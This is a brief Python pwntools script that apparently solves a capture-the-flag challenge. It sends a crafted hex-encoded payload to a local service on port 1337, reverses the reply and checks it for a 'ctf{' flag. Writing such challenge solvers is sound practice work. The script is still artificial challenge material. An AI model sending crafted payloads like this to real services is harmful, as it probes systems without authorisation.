#!/usr/bin/env python3
from time import sleep
from pwn import *

def main():
    r = remote("127.0.0.1", 1337)
    r.sendline(b'011b01017f41342100034020002d00001000200041016b22000d000b0b')
    
    sleep(1)
    out = r.recv(1024)
    print(out)

    out = out.replace(b'\n',b'')[::-1]
    print(out)
    if (b'ctf{' in out):
        exit(0)
    else:
        exit(1)

if __name__ == "__main__":
    main()
